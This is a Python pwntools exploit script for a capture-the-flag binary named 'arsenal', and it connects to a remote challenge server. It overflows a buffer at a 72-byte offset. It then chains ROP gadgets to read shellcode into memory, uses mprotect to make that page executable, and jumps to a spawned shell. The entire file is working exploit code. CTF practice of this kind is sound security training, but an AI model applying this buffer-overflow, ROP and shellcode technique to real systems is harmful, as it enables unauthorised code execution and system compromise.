#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./arsenal', checksec=False)

#p = process(elf.path)
p = remote('offsec.m0lecon.it', 13567)
shellcode = asm(shellcraft.sh())

OFFSET_TO_RIP = 72  


# place where we will put the shellcode, we can find it with nm ./arsenal | grep armory
shellcode = asm(shellcraft.sh())
armory_addr = elf.symbols['armory']
page = armory_addr & ~0xfff

# gadgets
pop_rdi = elf.symbols['pop_rdi_ret']
pop_rsi = elf.symbols['pop_rsi_ret']
pop_rdx = elf.symbols['pop_rdx_ret']
pop_rax = elf.symbols['pop_rax_ret']
syscall = elf.symbols['syscall_ret']
mprotect = elf.symbols['mprotect']
read = elf.symbols['read']

payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(pop_rdi), p64(0),       # read arg 1: stdin
    p64(pop_rsi), p64(armory_addr),       # read arg 2: where to write the shellcode
    p64(pop_rdx), p64(len(shellcode)),       # read arg 3: length of the shellcode
    p64(read),       # call read to write the shellcode in memory
    p64(pop_rdi), p64(page),       # mprotect arg 1: page-aligned address of the shellcode
    p64(pop_rsi), p64(0x1000),       # mprotect arg 2: size of the memory region to change permissions on
    p64(pop_rdx), p64(0x7),       # mprotect arg 3: new permissions (rwx)
    p64(mprotect),       # call mprotect to change permissions
    p64(armory_addr)                                  # jump to the shellcode
)

p.recvuntil(b'weapons:')
p.send(payload)
p.send(shellcode)

p.interactive()
